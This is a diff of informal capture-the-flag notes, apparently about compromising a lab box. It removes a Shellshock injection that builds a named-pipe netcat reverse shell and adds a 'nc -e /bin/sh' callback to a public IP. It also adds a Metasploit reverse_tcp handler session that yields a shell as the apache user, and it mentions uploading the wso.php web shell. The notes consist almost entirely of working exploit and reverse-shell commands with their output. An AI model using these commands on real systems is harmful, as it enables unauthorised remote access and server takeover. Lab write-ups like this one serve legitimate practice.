@@ -175,20 +175,27 @@ use wso.php to upload cgitelnet.pl to /cgi-bin/ to get a browser shell (kind of)
 
 this shit is old as fuck, circa 2001, wow...
 
-env x='() { :;}; mknod /tmp/backpipe p ' bash -c 'echo hello'
-
-then
-
-/bin/sh 0</tmp/backpipe | nc (public ip) 4447 1>/tmp/backpipe
+nc (public ip) 4448 -e /bin/sh
 
 and on my machine:
 
-root@kdog:~/ctf_shit/sambox_v2# nc -nlvp 4447
-listening on [any] 4447 ...
-connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 36991
+msf > use exploit/multi/handler 
+msf exploit(handler) > set lhost (public ip)
+msf exploit(handler) > set payload linux/x86/shell/reverse_tcp
+payload => linux/x86/shell/reverse_tcp
+msf exploit(handler) > set reverselistenerbindaddress 10.0.2.15
+reverselistenerbindaddress => 10.0.2.15
+msf exploit(handler) > set lport 4448
+lport => 4448
+msf exploit(handler) > run
+
+[*] Started reverse TCP handler on 10.0.2.15:4448 
+[*] Starting the payload handler...
+[*] Sending stage (36 bytes) to 10.0.2.2
+[*] Command shell session 1 opened (10.0.2.15:4448 -> 10.0.2.2:40997) at 2017-07-12 04:50:45 -0600
+
 id
 uid=48(apache) gid=48(apache) groups=48(apache)
-
 ok so now we have an actual backdoor, SOON...
 
 
